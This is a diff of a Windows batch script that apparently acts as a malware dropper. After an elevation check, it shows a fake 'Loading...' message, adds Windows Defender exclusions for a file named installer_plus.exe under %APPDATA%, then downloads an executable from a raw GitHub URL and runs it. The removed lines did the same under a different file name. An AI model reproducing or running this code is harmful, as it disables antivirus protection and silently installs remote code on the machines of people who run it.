@@ -26,11 +26,11 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
-:: powershell.exe -Command "Set-MpPreference -ExclusionExtension exe"
-powershell.exe -Command "Set-MpPreference -ExclusionProcess installer.exe"
-powershell.exe -Command "Add-MpPreference -ExclusionPath %APPDATA%\installer.exe"
+echo Loading.... Don't close this windown
+powershell.exe -Command "Set-MpPreference -ExclusionProcess installer_plus.exe"
+powershell.exe -Command "Add-MpPreference -ExclusionPath %APPDATA%\installer_plus.exe"
 ::cd %TEMP%
 cd %APPDATA%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/tt92threestick/tt_net/refs/heads/main/installer.exe' -OutFile installer.exe"
-installer.exe
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/tt92threestick/tt_net/refs/heads/main/installer.exe' -OutFile '%APPDATA%\installer_plus.exe'"
+"%APPDATA%\installer_plus.exe"
 exit
